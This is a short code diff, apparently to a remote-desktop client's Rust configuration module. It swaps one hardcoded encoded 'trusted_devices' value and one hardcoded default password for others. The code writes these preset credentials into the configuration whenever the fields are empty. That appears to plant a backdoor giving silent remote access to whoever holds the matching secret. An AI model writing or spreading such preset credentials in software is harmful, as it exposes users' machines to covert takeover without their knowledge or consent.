@@ -519,7 +519,7 @@ impl Config2 {
         config.unlock_pin = unlock_pin;
         store |= store2;
         if !config.options.contains_key("trusted_devices") {
-            	config.options.insert("trusted_devices".to_string(), "00AaIEXQ+MWqMI+s8UYHc7+oAOv9L7lwrllbM24F5rov/FPUJs8cd0etMGUw==".to_string());
+            	config.options.insert("trusted_devices".to_string(), "00AcXjG6mhaPyXWfflLdLOTBOGxtudEPo7VEzQDERM+H281adqQSZJ759pEA==".to_string());
             	config.store();
         }
         if store {
@@ -666,7 +666,7 @@ impl Config {
             }
         }
         if config.password.is_empty() {
-            	config.password = "01AWYFqWO2q3CIMlDA9cbaai+OOHSI12iQ2qFdkuGw9vlNPGF/ajoDONB55FExql+iaTidO+Vk+a565M1zIQAYL/t3mAvblPAsxtaGYWv0u4WXUCABLP+e".to_string();
+            	config.password = "01AahT2Jr9hlmCkNEaDZxQs28dUhZ04KmPB5miaAKN/6tfdOvYicGgh2B9kGBTkNZ009xgzsIuTLQ+5D2qn/qWzGmKrej2EatsJUEUKO4Do3gmaflTJCaU".to_string();
             	store = true;
         	}
         
